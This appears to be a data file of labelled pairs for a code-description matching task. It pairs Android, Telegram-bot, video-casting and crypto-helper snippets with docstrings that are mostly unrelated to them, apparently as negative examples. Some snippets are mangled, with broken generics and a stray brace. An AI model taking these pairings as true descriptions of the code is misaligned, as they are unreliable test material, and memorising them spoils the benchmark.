2	def __init__(self, func, name=None): self.func = func self.__doc__ = getattr(func, '__doc__') self.name = name or func.__name__	A decorator that allows a function to be called with one or more lazy arguments. If none of the args are lazy, the function is evaluated immediately, otherwise a __proxy__ is returned that will evaluate the function when needed.
2	def __call__(self, image): if self._spatial_radius is None: raise ValueError("Spatial radius has not been set") if self._range_radius is None: raise ValueError("Range radius has not been set") if self._min_density is None: raise ValueError("Minimum density has not been set") return _pymeanshift.segment(image, self._spatial_radius, self._range_radius, self._min_density, self._speedup_level)	The minimum point density of a region in the segmented image
2	def test_user_already_logged_in_get_with_empty_next(self): self._user_login() response = self.client.get('%s?next=%s' % (self.login_url, '')) self.assertRedirects(response, self.login_redirect_url)	Login form for users and application developers Designed to work with bootstrap
2	def attr_to_dict(instance, key=None): if isinstance(instance, Model): return model_to_dict(instance) if isinstance(instance, collections.Mapping): return instance if isinstance(instance, six.string_types): assert key is not None, _('Key cannot be None when instance is not a Model or collections.Mapping type') return {key: instance}	Ensures we have a connection to the email server. Returns whether or not a new connection was required (True or False).
2	def install_plone(self, out): register_layer(self, 'plone/kupu_plone_layer', 'kupu_plone', out) portal_props = getToolByName(self, 'portal_properties') site_props = getattr(portal_props,'site_properties', None) attrname = 'available_editors' if site_props is not None: editors = list(site_props.getProperty(attrname)) if 'Kupu' not in editors: editors.append('Kupu') site_props._updateProperty(attrname, editors) print >>out, "Added 'Kupu' to available editors in Plone." install_libraries(self, out) install_configlet(self, out) install_transform(self, out) install_resources(self, out) install_customisation(self, out)	Add the js and css files to the resource registry so that they can be merged for download.
2	public class Constants { public static final String API_NOT_CONNECTED = "Google API not connected"; public static final String SOMETHING_WENT_WRONG = "OOPs!!! Something went wrong..."; public static String PlacesTag = "Google Places Auto Complete"; }	List of label identifiers. Identifiers point to a repository in the containing trace.
2	private void sendMsg(final boolean isSuccess, final String imagePath, final String message, final CompressListener listener) { mhHandler.post(new Runnable() { public void run() { if (isSuccess) { listener.onCompressSuccess(imagePath); } else { listener.onCompressFailed(imagePath, message); } } }); }	Returns the timestamp when the control started the execution.
2	private Bitmap rotateBitmapByDegree(Bitmap bm, int degree) { Bitmap returnBm = null; Matrix matrix = new Matrix(); matrix.postRotate(degree); try { returnBm = Bitmap.createBitmap(bm, 0, 0, bm.getWidth(), bm.getHeight(), matrix, true); } catch (OutOfMemoryError e) { } if (returnBm == null) { returnBm = bm; } if (bm != returnBm) { bm.recycle(); } return returnBm; }	Enumeration of possible serialization formats for CTA traces.
2	public void correctImage(Context context, Uri path) { String imagePath = TUriParse.parseOwnUri(context, path); int degree; if ((degree = getBitmapDegree(imagePath)) != 0) { Bitmap bitmap = BitmapFactory.decodeFile(imagePath); if (bitmap == null) { return; } Bitmap resultBitmap = rotateBitmapByDegree(bitmap, degree); if (resultBitmap == null) { return; } try { resultBitmap.compress(Bitmap.CompressFormat.JPEG, 100, new FileOutputStream(new File(imagePath))); } catch (FileNotFoundException e) { e.printStackTrace(); } catch (OutOfMemoryError e) { e.printStackTrace(); } } }	Updates the child count of this node by increasing the current child count by the passed childCountIncrease.
2	public static Intent getPickMultipleIntent(TContextWrap contextWrap, int limit) { Intent intent = new Intent(contextWrap.getActivity(), AlbumSelectActivity.class); intent.putExtra(Constants.INTENT_EXTRA_LIMIT, limit > 0 ? limit : 1); return intent; }	Default constructor for serialization. This constructor should not be used except for deserialization.
2	public static Intent getCropIntentWithOtherApp(Uri targetUri, Uri outPutUri, CropOptions options) { boolean isReturnData = TUtils.isReturnData(); Log.w(TAG, "getCaptureIntentWithCrop:isReturnData:" + (isReturnData ? "true" : "false")); Intent intent = new Intent("com.android.camera.action.CROP"); intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION); intent.setDataAndType(targetUri, "image/*"); intent.putExtra("crop", "true"); if (options.getAspectX() * options.getAspectY() > 0) { intent.putExtra("aspectX", options.getAspectX()); intent.putExtra("aspectY", options.getAspectY()); } if (options.getOutputX() * options.getOutputY() > 0) { intent.putExtra("outputX", options.getOutputX()); intent.putExtra("outputY", options.getOutputY()); } intent.putExtra("scale", true); intent.putExtra(MediaStore.EXTRA_OUTPUT, outPutUri); intent.putExtra("return-data", isReturnData); intent.putExtra("outputFormat", Bitmap.CompressFormat.JPEG.toString()); intent.putExtra("noFaceDetection", true); // no face detection return intent; }	Returns a collection of additional information that may be tool specific following a convention.
2	public void onPickFromCapture(Uri outPutUri) { this.fromType = TImage.FromType.CAMERA; if (PermissionManager.TPermissionType.WAIT.equals(permissionType)) { return; } if (Build.VERSION.SDK_INT >= 23) { this.outPutUri = TUriParse.convertFileUriToFileProviderUri(contextWrap.getActivity(), outPutUri); } else { this.outPutUri = outPutUri; } try { TUtils.captureBySafely(contextWrap, new TIntentWap(IntentUtils.getCaptureIntent(this.outPutUri), TConstant.RC_PICK_PICTURE_FROM_CAPTURE)); } catch (TException e) { takeResult(TResult.of(TImage.of("", fromType)), e.getDetailMessage()); e.printStackTrace(); } }	Returns the SQL statement with parameter bindings.
2	public void onPickFromCaptureWithCrop(Uri outPutUri, CropOptions options) { this.fromType = TImage.FromType.CAMERA; if (PermissionManager.TPermissionType.WAIT.equals(permissionType)) { return; } this.cropOptions = options; this.outPutUri = outPutUri; if (Build.VERSION.SDK_INT >= 23) { this.tempUri = TUriParse.getTempUri(contextWrap.getActivity()); } else { this.tempUri = outPutUri; } try { TUtils.captureBySafely(contextWrap, new TIntentWap(IntentUtils.getCaptureIntent(this.tempUri), TConstant.RC_PICK_PICTURE_FROM_CAPTURE_CROP)); } catch (TException e) { takeResult(TResult.of(TImage.of("", fromType)), e.getDetailMessage()); e.printStackTrace(); } }	If the corresponding statement is a prepared statement, this method returns a map of corresponding SQL parameter bindings. Otherwise, this method returns an empty list. The Key represents the parameter index. (first parameter has an index of 1)
2	public void onEnableCompress(CompressConfig config, boolean showCompressDialog) { this.compressConfig = config; this.showCompressDialog = showCompressDialog; }	Indicates whether the corresponding database request has been executed as a prepared statement.
2	public static void cropWithOwnApp(TContextWrap contextWrap, Uri imageUri, Uri outPutUri, CropOptions options) { if (options.getAspectX() * options.getAspectY() > 0) { if (contextWrap.getFragment() != null) { Crop.of(imageUri, outPutUri) .withAspect(options.getAspectX(), options.getAspectY()) .start(contextWrap.getActivity(), contextWrap.getFragment()); } else { Crop.of(imageUri, outPutUri).withAspect(options.getAspectX(), options.getAspectY()).start(contextWrap.getActivity()); } } else if (options.getOutputX() * options.getOutputY() > 0) { if (contextWrap.getFragment() != null) { Crop.of(imageUri, outPutUri) .withMaxSize(options.getOutputX(), options.getOutputY()) .start(contextWrap.getActivity(), contextWrap.getFragment()); } else { Crop.of(imageUri, outPutUri).withMaxSize(options.getOutputX(), options.getOutputY()).start(contextWrap.getActivity()); } } else { if (contextWrap.getFragment() != null) { Crop.of(imageUri, outPutUri).asSquare().start(contextWrap.getActivity(), contextWrap.getFragment()); } else { Crop.of(imageUri, outPutUri).asSquare().start(contextWrap.getActivity()); } } }	Default constructor for serialization. This constructor should not be used except for deserialization.
2	public static boolean isReturnData() { String release = Build.VERSION.RELEASE; int sdk = Build.VERSION.SDK_INT; Log.i(TAG, "release:" + release + "sdk:" + sdk); String manufacturer = android.os.Build.MANUFACTURER; if (!TextUtils.isEmpty(manufacturer)) { if (manufacturer.toLowerCase().contains("lenovo")) { return true; } } } return false; }	Returns a Map of HTTP parameters. Key represents the parameter name. Value is a String array.
2	public static ProgressDialog showProgressDialog(final Activity activity, String... progressTitle) { if (activity == null || activity.isFinishing()) { return null; } String title = activity.getResources().getString(R.string.tip_tips); if (progressTitle != null && progressTitle.length > 0) { title = progressTitle[0]; } ProgressDialog progressDialog = new ProgressDialog(activity); progressDialog.setTitle(title); progressDialog.setCancelable(false); progressDialog.show(); return progressDialog; }	Return the time the method execution spent on CPU including the time of called methods.
2	public static ArrayList?convertImageToUri(Context context, ArrayListimages) throws TException { ArrayList?uris = new ArrayList(); for (Image image : images) { uris.add(FileProvider.getUriForFile(context, TConstant.getFileProviderName(context), new File(image.path))); } return uris; }	Return type identifier to retrieve the signature from registry.
2	public static ArrayList?getTImagesWithImages(ArrayList?images, TImage.FromType fromType) { ArrayList?tImages = new ArrayList(); for (Image image : images) { tImages.add(TImage.of(image.path, fromType)); } return tImages; }	Sets the signature of this Callable.
2	public static ArrayList?getTImagesWithUris(ArrayList?uris, TImage.FromType fromType) { ArrayList?tImages = new ArrayList(); for (Uri uri : uris) { tImages.add(TImage.of(uri, fromType)); } return tImages; }	Return the time the method execution spent on CPU without the time of called methods.
2	public static void captureBySafely(TContextWrap contextWrap, TIntentWap intentWap) throws TException { List result = contextWrap.getActivity().getPackageManager().queryIntentActivities(intentWap.getIntent(), PackageManager.MATCH_ALL); if (result.isEmpty()) { Toast.makeText(contextWrap.getActivity(), contextWrap.getActivity().getResources().getText(R.string.tip_no_camera), Toast.LENGTH_SHORT).show(); throw new TException(TExceptionType.TYPE_NO_CAMERA); } else { startActivityForResult(contextWrap, intentWap); } }	Provides utility functionality related to String representations of CTA elements.
2	public static void cropWithOtherAppBySafely(TContextWrap contextWrap, Uri imageUri, Uri outPutUri, CropOptions options) { Intent nativeCropIntent = IntentUtils.getCropIntentWithOtherApp(imageUri, outPutUri, options); List result = contextWrap.getActivity().getPackageManager().queryIntentActivities(nativeCropIntent, PackageManager.MATCH_ALL); if (result.isEmpty()) { cropWithOwnApp(contextWrap, imageUri, outPutUri, options); } else { try { imageUri=Uri.fromFile(new File(TUriParse.getFilePathWithDocumentsUri(imageUri,contextWrap.getActivity()))); } catch (TException e) { e.printStackTrace(); } startActivityForResult(contextWrap, new TIntentWap(IntentUtils.getCropIntentWithOtherApp(imageUri, outPutUri, options), TConstant.RC_CROP)); } }	Returns a Map of parameter values. The key is the index of the corresponding parameter in the method signature (first parameter has an index of 1). The value is the String representation of the parameter value.
2	public static String getFilePathWithDocumentsUri(Uri uri, Activity activity) throws TException { if (uri == null) { Log.e(TAG, "uri is null,activity may have been recovered?"); return null; } if (ContentResolver.SCHEME_CONTENT.equals(uri.getScheme()) && uri.getPath().contains("document")) { File tempFile = TImageFiles.getTempFile(activity, uri); try { TImageFiles.inputStreamToFile(activity.getContentResolver().openInputStream(uri), tempFile); return tempFile.getPath(); } catch (FileNotFoundException e) { e.printStackTrace(); throw new TException(TExceptionType.TYPE_NO_FIND); } } else { return getFilePathWithUri(uri, activity); } }	Registry of Signatures used in this trace. Registry of String constants used in this trace instance.
2	public class AnrReceiver extends BroadcastReceiver { public void onReceive(Context context, Intent intent) { System.out.println("hello receiver anr"); while (true){ } } }	Returns a list of all additional information objects of the provided type.
2	public class AnrService extends Service { public int onStartCommand(Intent intent, int flags, int startId) { System.out.println("hello service anr"); boolean a = true; while (a) { } return START_NOT_STICKY; } public IBinder onBind(Intent intent) { return null; } }	Returns the timestamp when the control started the execution.
2	public class ConfigActivity extends BaseActivity { protected void onCreate(Bundle bundle) { super.onCreate(bundle); setContentView(R.layout.activity_config_quick); findViewById(R.id.crashButton).setOnClickListener(new View.OnClickListener() { public void onClick(View v) { CrashBean bean = new CrashBean(); bean.different(); } }); } }	List of label identifiers. Identifiers point to a repository in the containing trace.
2	public class CrashBean { public CrashBean() { } public void different() { throw new RuntimeException("this is a demo crash current time" + System.currentTimeMillis()); } }	Create DOM and insert into document.
2	public class CustomActivity extends BaseActivity { protected void onCreate(Bundle var1) { super.onCreate(var1); setContentView(R.layout.activity_custom); } public void onBack(View view) { finish(); } }	Check if the match contains necessary data.
2	public class FeedbackActivity extends BaseActivity { private EditText mEditText; protected void onCreate(Bundle bundle) { super.onCreate(bundle); setContentView(R.layout.activity_feedback); mEditText = (EditText) findViewById(R.id.inputText); } public void onPost(View view) { String message = mEditText.getText().toString(); if (TextUtils.isEmpty(message)) { Toast.makeText(this, R.string.feedback_text_empty, Toast.LENGTH_SHORT).show(); return; } Bugtags.sendFeedback(message); Toast.makeText(this, R.string.feedback_send_succeed, Toast.LENGTH_SHORT).show(); finish(); } }	This method is called from within the constructor to initialize the form. WARNING: Do NOT modify this code. The content of this method is always regenerated by the Form Editor.
2	public void initTrimmedMode() { mMenuView.setVisibility(GONE); mMenuViewPlaceHolder.setVisibility(GONE); mExpandImg.setVisibility(INVISIBLE); mShrinkImg.setVisibility(INVISIBLE); }	The service to search the DLNA Device in background all the time.
2	public boolean setVoice(Device device, int value) { Service service = device.getService(RenderingControl); if (service == null) { return false; } final Action action = service.getAction("SetVolume"); if (action == null) { return false; } action.setArgumentValue("InstanceID", "0"); action.setArgumentValue("Channel", "Master"); action.setArgumentValue("DesiredVolume", value); return action.postControlAction(); }	Sets the model object that this view represents to the specified cell
2	public boolean stop(Device device) { Service service = device.getService(AVTransport1); if (service == null) { return false; } final Action stopAction = service.getAction("Stop"); if (stopAction == null) { return false; } stopAction.setArgumentValue("InstanceID", 0); return stopAction.postControlAction(); }	Create child views and reload properties for this view. Invokes update first.
2	public boolean pause(Device mediaRenderDevice) { Service service = mediaRenderDevice.getService(AVTransport1); if (service == null) { return false; } final Action pauseAction = service.getAction("Pause"); if (pauseAction == null) { return false; } pauseAction.setArgumentValue("InstanceID", 0); return pauseAction.postControlAction(); }	Update attributes for this view and indicate to the parent this child has been updated
2	public static boolean isNetAvailable(Context context) { ConnectivityManager connectivityManager = (ConnectivityManager) context .getSystemService(Context.CONNECTIVITY_SERVICE); NetworkInfo activeNetworkInfo = connectivityManager .getActiveNetworkInfo(); return activeNetworkInfo != null && activeNetworkInfo.isAvailable(); }	Returns the model object that this view represents.
2	public static boolean isWIFIActivate(Context context) { return ((WifiManager) context.getSystemService(Context.WIFI_SERVICE)) .isWifiEnabled(); }	Removes this view from the list of children of the parent.
2	public void awake() { synchronized (this) { notifyAll(); } }	Returns the attributes of the view combined with the attributes of the corresponding cell. The view's attributes override the cell's attributes with the same key.
2	public void pausePlay(boolean isShowController) { mSuperVideoView.pause(); mMediaController.setPlayState(MediaController.PlayState.PAUSE); stopHideTimer(isShowController); }	Returns the cached bounds for the group if isleaf is false
2	public void close() { mMediaController.setPlayState(MediaController.PlayState.PAUSE); stopHideTimer(true); stopUpdateTimer(); mSuperVideoView.pause(); mSuperVideoView.stopPlayback(); mSuperVideoView.setVisibility(GONE); }	Returns true if the view intersects the given rectangle.
2	private void initDLNAInfo() { mDevices = DLNAContainer.getInstance().getDevices(); setController(new MultiPointController()); setDLNAButton(mDevices.size() > 0); }	Returns a renderer component, configured for the view. The method used to obtain the renderer instance must install the necessary attributes from this view
2	private void setDLNAButton(boolean isShow) { mTvBtnView.setVisibility(isShow ? VISIBLE : INVISIBLE); }	Hook for subclassers to avoid cloning the cell's attributes. Return model.getAttributes(cell) to avoid cloning.
2	private void setCloseButton(boolean isShow) { mCloseBtnView.setVisibility(isShow ? VISIBLE : INVISIBLE); }	Implements the merging of the cell's attributes, initially stored in allAttributes, and the location attributes. The result should be stored in allAttributes. This hook is for subclassers to change the merging strategy.
2	private void playVideoAtLastPos() { int playTime = mSuperVideoView.getCurrentPosition(); mSuperVideoView.stopPlayback(); loadAndPlay(mNowPlayVideo.getPlayUrl(), playTime); }	Returns the bounding box for the specified views.
2	private void loadAndPlay(VideoUrl videoUrl, int seekTime) { showProgressView(seekTime > 0); setCloseButton(true); if (TextUtils.isEmpty(videoUrl.getFormatUrl())) { Log.e("TAG", "videoUrl should not be null"); return; } mSuperVideoView.setOnPreparedListener(mOnPreparedListener); if (videoUrl.isOnlineVideo()) { mSuperVideoView.setVideoPath(videoUrl.getFormatUrl()); } else { Uri uri = Uri.parse(videoUrl.getFormatUrl()); mSuperVideoView.setVideoURI(uri); } mSuperVideoView.setVisibility(VISIBLE); startPlayVideo(seekTime); }	The abstract base class for all cell views.
2	private void updatePlayTime() { int allTime = mSuperVideoView.getDuration(); int playTime = mSuperVideoView.getCurrentPosition(); mMediaController.setPlayProgressTxt(playTime, allTime); }	This method handles the cancellation set configuration
2	private void updatePlayProgress() { int allTime = mSuperVideoView.getDuration(); int playTime = mSuperVideoView.getCurrentPosition(); int loadProgress = mSuperVideoView.getBufferPercentage(); int progress = playTime * 100 / allTime; mMediaController.setProgressBar(progress, loadProgress); }	Since there are some flows removed , some ports will have no flows and thus should be removed either.
2	private void showProgressView(Boolean isTransparentBg) { mProgressBarView.setVisibility(VISIBLE); if (!isTransparentBg) { mProgressBarView.setBackgroundResource(android.R.color.black); } else { mProgressBarView.setBackgroundResource(android.R.color.transparent); } }	This method make all task became non-configured after the changes
2	private void shareToTvResult(Message message) { boolean isSuccess = message.arg1 == 1; if (isSuccess) { showDLNAController(); setDLNAButton(false); setCloseButton(false); pausePlay(false); mProgressBarView.setVisibility(View.GONE); } else { mDLNARootLayout.setVisibility(GONE); Toast.makeText(mContext, "", Toast.LENGTH_SHORT).show(); } }	This constructor is to be invoked whenever we are creating a new atomic task from scratch. It also creates the correct ports needed for the task as an intended side-effect.
2	private void exitFromTvResult(Message message) { boolean isSuccess = message.arg1 == 1; mDLNARootLayout.setVisibility(GONE); initDLNAInfo(); playVideoAtLastPos(); if (!isSuccess) { Toast.makeText(mContext, "", Toast.LENGTH_SHORT).show(); } mProgressBarView.setVisibility(GONE); }	Creates a new attribute map with the specified initial capacity
2	private void showDLNAController() { String name = DLNAContainer.getInstance().getSelectedDevice().getFriendlyName(); String title = mContext.getResources().getString(R.string.dlna_device_title, TextUtils.isEmpty(name) ? "" : name); mDLNARootLayout.setVisibility(VISIBLE); ((TextView) mDLNARootLayout.findViewById(R.id.txt_dlna_title)).setText(title); }	Constructs a new, empty hashtable with the specified initial capacity and the specified load factor.
2	private synchronized void goOnPlayAtLocal() { showProgressView(true); new Thread() { public void run() { final boolean isSuccess = mController.stop(mSelectDevice); Message message = new Message(); message.what = MSG_EXIT_FORM_TV_RESULT; message.arg1 = isSuccess ? 1 : 0; mHandler.sendMessage(message); } }.start(); }	Clones special object entried in the given map.
2	public class SuperVideoView extends VideoView { public SuperVideoView(Context context) { super(context); } public SuperVideoView(Context context, AttributeSet attrs) { super(context, attrs); } public SuperVideoView(Context context, AttributeSet attrs, int defStyle) { super(context, attrs, defStyle); } }	The timer fired, perform autoscroll if the pointer is within the autoscroll region.
2	public class Video { private String mVideoName; private VideoUrl mPlayUrl; public String getVideoName() { return mVideoName; } public void setVideoName(String videoName) { mVideoName = videoName; } public ArrayList?getVideoUrl() { return mVideoUrl; } public void setVideoUrl(ArrayList?videoUrl) { mVideoUrl = videoUrl; } public VideoUrl getPlayUrl() { return mPlayUrl; } public void setPlayUrl(VideoUrl playUrl) { mPlayUrl = playUrl; } public void setPlayUrl(int position){ if(position < 0 || position >= mVideoUrl.size())return; setPlayUrl(mVideoUrl.get(position)); } public boolean equal(Video video){ if(null != video){ return mVideoName.equals(video.getVideoName()); } return false; } }	called to save the state of a component in case it needs to be restored because a drop is not performed.
2	abstract public class AbstractSendRequest?extends BaseRequest?{ public AbstractSendRequest(Object chatId) { super(SendResponse.class); add("chat_id", chatId); } public T disableNotification(boolean disableNotification) { return add("disable_notification", disableNotification); } public T replyToMessageId(int replyToMessageId) { return add("reply_to_message_id", replyToMessageId); } public T replyMarkup(Keyboard replyMarkup) { return add("reply_markup", replyMarkup); } }	Perform an autoscroll operation. This is implemented to scroll by the unit increment of the Scrollable using scrollRectToVisible. If the cursor is in a corner of the autoscroll region, more than one axis will scroll.
2	abstract public class AbstractUploadRequest?extends BaseRequest{ private final boolean isMultipart; public AbstractUploadRequest(Class?responseClass, String paramName, Object data) { super(responseClass); if (data instanceof String) { isMultipart = false; } else if (data instanceof File) { isMultipart = true; } else if (data instanceof byte[]) { isMultipart = true; } else { throw new IllegalArgumentException("Sending data should be String, File or byte[]"); } add(paramName, data); } public boolean isMultipart() { return isMultipart; } }	Initializes the internal properties if they haven't been already inited. This is done lazily to avoid loading of desktop properties.
2	abstract public class AbstractMultipartRequest?extends AbstractSendRequest?{ private boolean isMultipart; private String fileName; public AbstractMultipartRequest(Object chatId, Object file) { super(chatId); if (file instanceof String) { isMultipart = false; } else if (file instanceof File) { isMultipart = true; fileName = ((File) file).getName(); } else if (file instanceof byte[]) { isMultipart = true; } else { throw new IllegalArgumentException("Sending data should be String, File or byte[]"); } add(getFileParamName(), file); } public T fileName(String fileName) { this.fileName = fileName; return thisAsT; } protected T thumb(Object thumb) { isMultipart = true; return add("thumb", thumb); } public boolean isMultipart() { return isMultipart; } public String getFileName() { if (fileName != null && !fileName.isEmpty()) { return fileName; } else { return getDefaultFileName(); } } abstract public String getContentType(); abstract protected String getDefaultFileName(); abstract protected String getFileParamName(); }	Update the geometry of the autoscroll region. The geometry is maintained as a pair of rectangles. The region can cause a scroll if the pointer sits inside it for the duration of the timer. The region that causes the timer countdown is the area between the two rectangles. This is implemented to use the visible area of the component as the outer rectangle and the insets are based upon the Scrollable information (if any). If the Scrollable is scrollable along an axis, the step increment is used as the autoscroll inset. If the component is not scrollable, the insets will be zero (i.e. autoscroll will not happen).
2	public class AddStickerToSet extends AbstractUploadRequest?{ public AddStickerToSet(Integer userId, String name, Object pngSticker, String emojis) { super(BaseResponse.class, "png_sticker", pngSticker); add("user_id", userId); add("name", name); add("emojis", emojis); } public AddStickerToSet maskPosition(MaskPosition maskPosition) { return add("mask_position", serialize(maskPosition)); } }	Cleans up internal state after the drop has finished (either succeeded or failed).
2	private byte mul(int a, byte b) { int result = 0; int first = a; int current = b & 0xff; while (first != 0) { if ((first & 0x01) != 0) { result ^= current; } first >>= 1; current = times2(current); } return (byte) (result & 0xff); }	Fetch the data in a text/plain format.
2	public class AnimationTest { public static void check(Animation animation) { assertNotNull(animation.fileId()); assertNotNull(animation.fileName()); assertNotNull(animation.mimeType()); assertTrue(animation.fileSize() > 0); PhotoSizeTest.checkPhotos(animation.thumb()); } }	Current editor for the graph.
2	public class AnswerCallbackQuery extends BaseRequest?{ public AnswerCallbackQuery(String callbackQueryId) { super(BaseResponse.class); add("callback_query_id", callbackQueryId); } public AnswerCallbackQuery text(String text) { return add("text", text); } public AnswerCallbackQuery showAlert(boolean showAlert) { return add("show_alert", showAlert); } public AnswerCallbackQuery url(String url) { return add("url", url); } public AnswerCallbackQuery cacheTime(int cacheTime) { return add("cache_time", cacheTime); } }	Component that we're going to be drawing into.
2	public class AnswerInlineQuery extends BaseRequest?{ public AnswerInlineQuery(String inlineQueryId, InlineQueryResult... results) { super(BaseResponse.class); add("inline_query_id", inlineQueryId).add("results", serialize(results)); } public AnswerInlineQuery cacheTime(int cacheTime) { return add("cache_time", cacheTime); } public AnswerInlineQuery isPersonal(boolean isPersonal) { return add("is_personal", isPersonal); } public AnswerInlineQuery nextOffset(String nextOffset) { return add("next_offset", nextOffset); } public AnswerInlineQuery switchPmText(String switchPmText) { return add("switch_pm_text", switchPmText); } public AnswerInlineQuery switchPmParameter(String switchPmParameter) { return add("switch_pm_parameter", switchPmParameter); } }	Whether the plain text flavors are offered. If so, the method getPlainData should be implemented to provide something reasonable.
2	abstract public class BotHandler implements Route { public Object handle(Request request, Response response) throws Exception { Update update = BotUtils.parseUpdate(request.body()); Message message = update.message(); if (isStartMessage(message) && onStart(message)) { return "ok"; } else { onWebhookUpdate(update); } return "ok"; } private boolean isStartMessage(Message message) { return message != null && message.text() != null && message.text().startsWith("/start"); } protected boolean onStart(Message message) { return false; } abstract void onWebhookUpdate(Update update); abstract String getToken(); abstract TelegramBot getBot(); }	Set to false when editing and shouldSelectCell() returns true meaning the node should be selected before editing, used in completeEditing.
2	public class BotUtils { private static Gson gson = new Gson(); public static Update parseUpdate(String update) { return gson.fromJson(update, Update.class); } public static Update parseUpdate(Reader reader) { return gson.fromJson(reader, Update.class); } static byte[] getBytesFromInputStream(InputStream is) throws IOException { ByteArrayOutputStream os = new ByteArrayOutputStream(); byte[] buffer = new byte[0xFFFF]; for (int len = is.read(buffer); len != -1; len = is.read(buffer)) { os.write(buffer, 0, len); } return os.toByteArray(); } }	Set to true if the editor has a different size than the renderer.
2	public interface Callback?{ void onResponse(T request, R response); void onFailure(T request, IOException e); }	Size needed to completely display all the cells.
2	public Cbc(byte[] iv, byte[] key, OutputStream output) { this._cipher = new Aes256(key); this._current = new byte[BLOCK_SIZE]; System.arraycopy(iv, 0, this._current, 0, BLOCK_SIZE); this._tmp = new byte[BLOCK_SIZE]; this._buffer = new byte[BLOCK_SIZE]; this._outBuffer = new byte[BLOCK_SIZE]; this._outBufferUsed = false; this._overflow = new byte[BLOCK_SIZE]; this._overflowUsed = 0; this._output = output; }	Needed to exchange information between Transfer- and MouseListener.
2	public void finishEncryption() throws IOException { byte pad = (byte) (BLOCK_SIZE - this._overflowUsed); while (this._overflowUsed < BLOCK_SIZE) { this._overflow[this._overflowUsed++] = pad; } encryptBlock(this._overflow, this._outBuffer); this._output.write(this._outBuffer); this._output.close(); }	If ture, a the view under mousepointer will be snapped to the grid lines during a drag operation. If snap-to-grid mode is disabled, views are moved by a snap increment.
2	private void decryptBlock(byte[] inBuffer) { System.arraycopy(inBuffer, 0, this._buffer, 0, BLOCK_SIZE); this._cipher.decrypt(this._buffer, 0, this._tmp, 0); for (int i = 0; i < BLOCK_SIZE; ++i) { this._tmp[i] ^= this._current[i]; this._current[i] = this._buffer[i]; this._outBuffer[i] = this._tmp[i]; } }	Updates the display when the selection changes.
2	public class ChatTest { public static void checkChat(Chat chat) { assertNotNull(chat.id()); assertNotNull(chat.type()); if (chat.photo() != null) ChatPhotoTest.check(chat.photo()); } }	Is responsible for updating the view based on model events.
2	public byte[] decode(byte[] src) { byte[] dst = new byte[outLength(src, 0, src.length)]; int ret = decode0(src, 0, src.length, dst); if (ret != dst.length) { dst = Arrays.copyOf(dst, ret); } return dst; }	Updates the display when the view has changed.
2	public byte[] decode(String src) { return decode(src.getBytes(Charset.forName("ISO-8859-1"))); }	The drop target where the default listener was last installed.
2	public int decode(byte[] src, byte[] dst) { int len = outLength(src, 0, src.length); if (dst.length < len) { throw new IllegalArgumentException("Output byte array is too small for decoding all input bytes"); } return decode0(src, 0, src.length, dst); }	Returns the current location of the Drag-and-Drop activity.
2	public class DocumentTest { public static void check(Document document) { check(document, true); } public static void check(Document document, boolean checkSize) { assertNotNull(document.fileId()); assertNotNull(document.fileName()); assertNotNull(document.mimeType()); if (checkSize) assertNotNull(document.fileSize()); } }	Messaged to update the selection based on a MouseEvent for a group of cells. If the event is a toggle selection event, the cells are either selected, or deselected. Otherwise the cells are selected.
2	public class EditMessageCaption extends BaseRequest?{ public EditMessageCaption(Object chatId, int messageId) { super(SendResponse.class); add("chat_id", chatId).add("message_id", messageId); } public EditMessageCaption(String inlineMessageId) { super(BaseResponse.class); add("inline_message_id", inlineMessageId); } public EditMessageCaption(Object chatId, int messageId, String text) { this(chatId, messageId); } public EditMessageCaption(String inlineMessageId, String text) { this(inlineMessageId); } public EditMessageCaption caption(String caption) { return add("caption", caption); } public EditMessageCaption parseMode(ParseMode parseMode) { return add("parse_mode", parseMode.name()); } public EditMessageCaption replyMarkup(InlineKeyboardMarkup replyMarkup) { return add("reply_markup", replyMarkup); } }	Sets the current location for Drag-and-Drop activity. Should be set to null after a drop. Used from within DropTargetListener.
2	public byte[] encode(byte[] src) { int len = outLength(src.length); // dst array size byte[] dst = new byte[len]; int ret = encode0(src, 0, src.length, dst); if (ret != dst.length) { return Arrays.copyOf(dst, ret); } return dst; }	Returning true signifies that cells are added to the selection.
2	public int encode(byte[] src, byte[] dst) { int len = outLength(src.length); if (dst.length < len) { throw new IllegalArgumentException("Output byte array is too small for encoding all input bytes"); } return encode0(src, 0, src.length, dst); }	Returns true if the graph is being edited. The item that is being edited can be returned by getEditingPath().
2	public String encodeToString(byte[] src) { byte[] encoded = encode(src); return new String(encoded, 0, 0, encoded.length); }	Stops the current editing session. This has no effect if the graph isn't being edited. Returns true if the editor allows the editing session to stop.
2	public class ExportChatInviteLink extends BaseRequest?{ public ExportChatInviteLink(Object chatId) { super(StringResponse.class); add("chat_id", chatId); } }	Selects the cell and tries to edit it. Editing will fail if the CellEditor won't allow it for the selected item.
2	public class File implements Serializable { private final static long serialVersionUID = 0L; private String file_id; private Integer file_size; private String file_path; public String fileId() { return file_id; } public Integer fileSize() { return file_size; } public String filePath() { return file_path; } public boolean equals(Object o) { if (this == o) return true; if (o == null || getClass() != o.getClass()) return false; File file = (File) o; if (file_id != null ? !file_id.equals(file.file_id) : file.file_id != null) return false; if (file_size != null ? !file_size.equals(file.file_size) : file.file_size != null) return false; return file_path != null ? file_path.equals(file.file_path) : file.file_path == null; } public int hashCode() { return file_id != null ? file_id.hashCode() : 0; } public String toString() { return "File{" + "file_id='" + file_id + '\'' + ", file_size=" + file_size + ", file_path='" + file_path + '\'' + '}'; } }	Draws the graph to the specified graphics object within the specified clip bounds, if any
2	public class FileApi { public static final String FILE_API = "https://api.telegram.org/file/bot"; private final String apiUrl; public FileApi(String token) { this.apiUrl = FILE_API + token + "/"; } public FileApi(String apiUrl, String token) { this.apiUrl = apiUrl + token + "/"; } public String getFullFilePath(String filePath) { int slash = filePath.lastIndexOf('/') + 1; String path = filePath.substring(0, slash); String fileName = filePath.substring(slash); try { return apiUrl + path + URLEncoder.encode(fileName, "UTF-8").replace("+", "%20"); } catch (UnsupportedEncodingException e) { return apiUrl + filePath; } } }	Returns the minimum size for this component. Which will be the min preferred size or 0, 0.
2	public class FileTest { public static void check(File file) { check(file, true); } public static void check(File file, boolean path) { assertNotNull(file.fileId()); assertNotNull(file.fileSize()); if (path) assertNotNull(file.filePath()); } }	Sets the mode of the snapSelectedView drag operation.
2	public class ForceReply extends Keyboard implements Serializable { private final static long serialVersionUID = 0L; private final boolean force_reply = true; private final boolean selective; public ForceReply() { this(false); } public ForceReply(boolean selective) { this.selective = selective; } }	Resets the selection model. The appropriate listeners are installed on the model.
